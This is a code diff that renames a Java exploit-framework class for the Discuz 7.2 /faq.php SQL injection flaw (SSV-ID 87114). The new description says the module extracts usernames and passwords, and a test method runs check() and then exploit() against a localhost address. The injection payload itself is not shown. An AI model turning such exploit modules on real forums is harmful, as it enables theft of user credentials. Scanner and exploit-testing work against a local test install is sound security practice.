@@ -18,16 +18,16 @@ import cn.com.nike.policy.bean.ParameterConstant;
 import cn.com.nike.policy.bean.WebVulnData;
 import cn.com.nike.policy.util.PolicyUtil;
 
-public class Discuz_72_Injection extends PolicyInfo implements Policy {
+public class Discuz_72_Injection_UserInfo extends PolicyInfo implements Policy {
 
 	private String url = "";
 
-	public Discuz_72_Injection() {
-		POLICYNAME = Discuz_72_Injection.class.getName();
+	public Discuz_72_Injection_UserInfo() {
+		POLICYNAME = Discuz_72_Injection_UserInfo.class.getName();
 		POLICYID = "SSV-ID: 87114";
 		POLICYCOMPANY = "DISCUZ";
 		POLICYTIME = "2014-07-02";
-		POLICYDESCRIPTION = "Discuz 7.2 /faq.php SQL注入漏洞";
+		POLICYDESCRIPTION = "Discuz 7.2 /faq.php SQL注入漏洞获取用户名密码";
 	}
 
 	@Override
@@ -126,7 +126,7 @@ public class Discuz_72_Injection extends PolicyInfo implements Policy {
 
 		Map<String, Object> parameters = new HashMap<String, Object>();
 		parameters.put("url", "http://127.0.0.1:81/discuz71");
-		Discuz_72_Injection policy = new Discuz_72_Injection();
+		Discuz_72_Injection_UserInfo policy = new Discuz_72_Injection_UserInfo();
 		policy.setParameter(parameters);
 		if (policy.check())
 			policy.exploit();
